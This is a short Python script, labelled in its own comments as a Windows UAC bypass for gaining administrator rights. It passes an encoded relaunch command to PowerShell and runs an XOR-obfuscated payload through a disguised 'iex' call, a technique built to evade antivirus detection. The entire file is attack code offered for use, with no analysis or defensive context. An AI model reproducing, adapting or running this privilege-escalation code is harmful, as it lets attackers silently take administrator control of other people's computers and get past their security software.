# uac bypassing is a method used to gain admin  (detected by avs)
#don't even know who made this originally but it by me

import base64
import subprocess
import os

def uac_bypass():
    command = f"Start-Process {__file__}"
    code = bytearray(command, "utf-16-le")
    code = base64.b64encode(code).decode()
    setVar = "Set-Variable -Name 'code' -Value " + f'"{code}";'
    final_command = r"""[STrinG]::Join( '', ([cHAr[]] (101 , 35 ,8 ,58 , 96, 2 ,15 ,7 ,8,14 , 57 , 109 , 109,4, 34,99 ,14 , 34,0 , 61 , 63, 40,30, 62 ,36 ,34 ,35 ,99,9,8 , 43,33, 44, 57 ,40,30,25,63,8, 44 , 0 ,101 , 109 , 22 , 30 ,52 , 30 , 57,40 ,32 , 99,36,34, 99, 32 ,40, 32 ,34 ,31, 20, 30 ,25 , 31, 40,44,0,16,22, 46, 34 , 35,59 ,8,63, 25, 16, 119 ,119 , 43, 63 ,34 , 32 , 15 ,44,30 ,8, 123,121 , 30, 25, 63 ,36 ,3,42 , 101 ,109, 106 , 37, 20, 121,116,14,117 , 4,58, 10,4 ,25, 98,52,38,59 ,34 , 10 ,39, 62, 121,11,37 , 40, 1,60,4 ,42 , 43 ,24 ,5, 25,6 , 8, 61, 61 ,63,6 , 102 ,30,1, 7, 11,1 ,116 , 116, 55, 20,11,58,24 , 32 ,21,32 , 102,123,40 , 40 ,121, 63,55 , 46 , 47 ,57,36, 126,34 ,125, 4,46, 20 ,9 , 26 , 14, 55 , 53 , 15,43, 6, 30 ,15, 102, 0,33 ,41,46 ,57 , 42 ,116, 117 , 46,125,25 ,1 ,44 ,124, 43 ,21 , 62, 23 , 4 ,5,1 ,44, 33,34 ,35,24, 6, 53 , 6, 60, 12 ,35 , 60 ,31 , 30 ,53 , 5 ,44, 5 ,102, 36, 34 , 44,124,123, 27,31, 15, 34,37,44 ,25 , 125 ,124, 8,62, 21 ,14 ,32, 11 , 125, 126 ,32,36 ,63 ,2, 5 ,11 ,44, 125 , 55 ,31, 33 ,63,11 , 60,11 ,31 , 24, 25 , 0 ,116 ,24 , 41, 59,117, 28, 7,59,6 ,4, 33,2, 123,127,39 ,123, 7 ,102 , 37,15, 59 , 14,59,10 ,20,23, 55, 43,6 ,102,46, 127,34 , 123, 117,12,37 ,23,59 , 26,60,30,9, 4, 38, 126,10,59 ,9 , 8 ,4 ,52 ,124 , 35 , 59 ,4, 7,10 ,58,38,116 , 7 ,116 ,33 , 5 ,120 ,126,43 ,127, 127 ,32, 30 ,41 , 59, 106 ,100 ,109,97, 22, 30,52, 62, 25 ,8 , 0 , 99 , 36 ,34 , 99, 14,2, 0,61 , 31, 40, 62 , 30,36 , 34,35, 99, 46 ,34,0 ,29,31,8 ,30, 30,4,2,3, 0,34 , 9 , 8 , 16 , 119, 119 ,9 , 40 , 14,34, 32,61,63,40 ,62 ,62, 109 ,100,109 ,49 ,109 , 11 , 34,63,40 ,44 ,46 ,5,54 , 35 , 8,58 ,96,2, 15, 7, 8, 14, 57 ,109,4, 34 ,99 ,30, 57 ,31, 40 ,44,0, 63 , 8,44 , 9 ,40,63,101, 109 ,105 , 18, 97 ,22, 30 ,52 , 30 ,25 ,8 , 0, 99,57 ,40 , 21,25,99, 40 ,35, 14 , 2,41 , 4, 3 ,10 ,16,119 , 119 , 44 , 30 , 46 , 36 , 4, 109 , 100,48 ,100 , 99,63,8 ,44, 9 , 25 ,2,8,35,41 , 101 , 109,100,109, 49 ,109 , 4 , 35 , 27, 34 , 6,8, 96 ,40, 53 ,61, 31 , 8, 62, 62 ,4,2 ,3) |% {[cHAr]( $_-bXor"0x4d" ) } ) ) |.( ([String]$verbOSEPRefeReNCE)[1,3]+'x'-JOin'')"""
    subprocess.run(["powershell", setVar, final_command])
    print("UAC Bypassed")
    os._exit(0)

uac_bypass()
